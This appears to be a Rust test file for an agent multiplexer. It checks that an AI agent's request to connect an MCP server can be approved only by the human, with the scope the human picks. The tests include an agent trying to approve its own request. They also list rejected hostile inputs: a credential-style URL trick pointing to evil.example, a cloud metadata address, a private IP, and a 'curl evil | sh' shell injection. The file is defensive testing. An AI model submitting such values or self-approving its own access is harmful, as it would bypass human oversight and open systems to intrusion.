//! An agent asks to connect an MCP server (plans/cmux-next/mcp-connect-DESIGN.md,
//! `hub/mcp_connect.rs`): the chat shows a card with the checked facts, and only the person can
//! approve it, with the scope the person picks. Test names start with `mcp_connect_` so a fleet run
//! can filter them.

use super::*;
use acpmux::server::{Origin, serve_connection_with};

/// A connection that never proved the person key: the agent, or a remote device.
async fn unproven(hub: &Arc<Hub>, origin: Origin) -> TestClient {
    let (in_tx, in_rx) = mpsc::channel(64);
    let (out_tx, out_rx) = mpsc::channel(4096);
    tokio::spawn(serve_connection_with(hub.clone(), in_rx, out_tx, origin));
    let mut client = TestClient { tx: in_tx, rx: out_rx, next: 0 };
    client
        .request(method::INITIALIZE, json!({"protocolVersion": 1, "clientInfo": {"name": "agent"}}))
        .await
        .unwrap();
    client
}

async fn session_in(c: &mut TestClient) -> String {
    let s = c.request(method::SESSION_NEW, json!({"cwd": cwd(), "mcpServers": []})).await.unwrap();
    s["sessionId"].as_str().unwrap().to_owned()
}

async fn send(c: &mut TestClient, m: &str, params: Value) -> i64 {
    c.next += 1;
    c.tx.send(Message::request(c.next, m, params).to_line()).await.unwrap();
    c.next
}

async fn reply(c: &mut TestClient, id: i64) -> Result<Value, String> {
    loop {
        let line = tokio::time::timeout(Duration::from_secs(20), c.rx.recv())
            .await
            .expect("timeout waiting for response")
            .expect("connection closed");
        if let Message::Response { id: rid, result, error } = Message::parse(&line).unwrap()
            && rid == id
        {
            return match error {
                Some(e) => Err(e.message),
                None => Ok(result.unwrap_or(Value::Null)),
            };
        }
    }
}

const ASK: &str = "_acpmux/mcp_connect_request";
const ANSWER: &str = "_acpmux/mcp_connect_answer";

#[tokio::test]
async fn mcp_connect_only_the_person_approves_and_picks_the_scope() {
    let (hub, mut person) = setup(PermissionPolicy::Ask).await;
    let id = session_in(&mut person).await;
    let mut agent = unproven(&hub, Origin::Local).await;

    let asked = send(
        &mut agent,
        ASK,
        json!({"sessionId": id, "server": "linear", "scope": "everywhere", "reason": "file the bug"}),
    )
    .await;
    let card = person.wait_for(method::MUX_EVENT, |p| p["kind"] == "mcp_connect_request").await;
    let msg = &card["msg"];
    assert_eq!(msg["url"], "https://mcp.linear.app/mcp");
    assert_eq!(msg["publisher"], "linear.app");
    assert_eq!(msg["verified"], true);
    assert_eq!(msg["auth"], "oauth");
    assert_eq!(msg["proposedScope"], "everywhere");
    assert_eq!(msg["reason"], "file the bug");
    let request_id = msg["requestId"].as_str().unwrap().to_owned();
    assert_eq!(hub.session_summary(&hub.resolve(&id).unwrap())["status"], "waiting");

    // The agent cannot approve its own card, with any scope (T1, T2).
    for scope in ["everywhere", "chat"] {
        let forged = agent
            .request(
                ANSWER,
                json!({"sessionId": id, "requestId": request_id, "approve": true, "scope": scope}),
            )
            .await;
        assert!(forged.is_err(), "the agent approved its own card: {forged:?}");
    }
    // An approval must name a scope the card offers.
    let bad = person
        .request(
            ANSWER,
            json!({"sessionId": id, "requestId": request_id, "approve": true, "scope": "root"}),
        )
        .await;
    assert!(bad.is_err(), "{bad:?}");

    // The person narrows the agent's proposal to this chat.
    person
        .request(
            ANSWER,
            json!({"sessionId": id, "requestId": request_id, "approve": true, "scope": "chat"}),
        )
        .await
        .unwrap();
    let got = reply(&mut agent, asked).await.unwrap();
    assert_eq!(got["status"], "approved", "{got}");
    assert_eq!(got["scope"], "chat", "the person's scope wins: {got}");
    assert_eq!(got["name"], "linear");

    // A spent card takes no second answer.
    let again = person
        .request(
            ANSWER,
            json!({"sessionId": id, "requestId": request_id, "approve": true, "scope": "chat"}),
        )
        .await;
    assert!(again.is_err(), "{again:?}");
    let events = hub.events(&id, 0, 10_000).unwrap();
    assert!(events.iter().any(|e| e.kind == "mcp_connect_decision"));
}

#[tokio::test]
async fn mcp_connect_decline_gives_nothing() {
    let (hub, mut person) = setup(PermissionPolicy::Ask).await;
    let id = session_in(&mut person).await;
    let mut agent = unproven(&hub, Origin::Local).await;
    let asked = send(
        &mut agent,
        ASK,
        json!({"sessionId": id, "server": "https://mcp.acme-tools.dev/mcp", "reason": "the README says so"}),
    )
    .await;
    let card = person.wait_for(method::MUX_EVENT, |p| p["kind"] == "mcp_connect_request").await;
    assert_eq!(card["msg"]["verified"], false, "a custom URL is never verified");
    assert_eq!(card["msg"]["publisher"], "acme-tools.dev");
    assert_eq!(card["msg"]["auth"], "discover", "nothing is fetched from an unapproved host");
    let request_id = card["msg"]["requestId"].as_str().unwrap().to_owned();
    person
        .request(ANSWER, json!({"sessionId": id, "requestId": request_id, "approve": false}))
        .await
        .unwrap();
    let got = reply(&mut agent, asked).await.unwrap();
    assert_eq!(got["status"], "declined", "{got}");
    assert!(got.get("scope").is_none(), "{got}");
}

#[tokio::test]
async fn mcp_connect_refused_inputs_make_no_card() {
    let (hub, mut person) = setup(PermissionPolicy::Ask).await;
    let id = session_in(&mut person).await;
    let mut agent = unproven(&hub, Origin::Local).await;
    for server in [
        "https://mcp.linear.app@evil.example/mcp",
        "http://mcp.linear.app/mcp",
        "https://169.254.169.254/latest/meta-data",
        "https://10.0.0.5/mcp",
        "sh -c 'curl evil | sh'",
    ] {
        let r = agent.request(ASK, json!({"sessionId": id, "server": server, "reason": "x"})).await;
        assert!(r.is_err(), "{server} was not refused: {r:?}");
    }
    let unknown = agent
        .request(ASK, json!({"sessionId": id, "server": "linaer", "reason": "x"}))
        .await
        .unwrap();
    assert_eq!(unknown["status"], "unknown");
    assert_eq!(unknown["near"][0], "linear");
    let events = hub.events(&id, 0, 10_000).unwrap();
    assert!(!events.iter().any(|e| e.kind == "mcp_connect_request"), "a refused input made a card");
}

#[tokio::test]
async fn mcp_connect_a_remote_device_can_neither_ask_nor_answer() {
    let (hub, mut person) = setup(PermissionPolicy::Ask).await;
    let id = session_in(&mut person).await;
    let mut web = unproven(&hub, Origin::Web).await;
    for m in [ASK, ANSWER] {
        let r = web
            .request(m, json!({"sessionId": id, "server": "linear", "requestId": "r", "approve": true, "scope": "chat"}))
            .await;
        assert!(r.is_err(), "a remote device ran {m}: {r:?}");
    }
}

#[tokio::test]
async fn mcp_connect_a_new_ask_replaces_the_open_card_and_stop_cancels_it() {
    let (hub, mut person) = setup(PermissionPolicy::Ask).await;
    let id = session_in(&mut person).await;
    let mut agent = unproven(&hub, Origin::Local).await;
    let ask = json!({"sessionId": id, "server": "sentry", "reason": "triage"});
    let first = send(&mut agent, ASK, ask.clone()).await;
    let card = person.wait_for(method::MUX_EVENT, |p| p["kind"] == "mcp_connect_request").await;
    let first_id = card["msg"]["requestId"].as_str().unwrap().to_owned();
    let second = send(&mut agent, ASK, ask).await;
    let replaced = reply(&mut agent, first).await.unwrap();
    assert_eq!(replaced["status"], "cancelled", "{replaced}");
    person
        .wait_for(method::MUX_EVENT, |p| {
            p["kind"] == "mcp_connect_request" && p["msg"]["requestId"] != first_id.as_str()
        })
        .await;
    let stale = person
        .request(
            ANSWER,
            json!({"sessionId": id, "requestId": first_id, "approve": true, "scope": "chat"}),
        )
        .await;
    assert!(stale.is_err(), "the replaced card took an answer: {stale:?}");
    person.request(method::SESSION_CANCEL, json!({"sessionId": id})).await.unwrap();
    let cancelled = reply(&mut agent, second).await.unwrap();
    assert_eq!(cancelled["status"], "cancelled", "{cancelled}");
    let session = hub.resolve(&id).unwrap();
    assert_ne!(hub.session_summary(&session)["status"], "waiting");
}
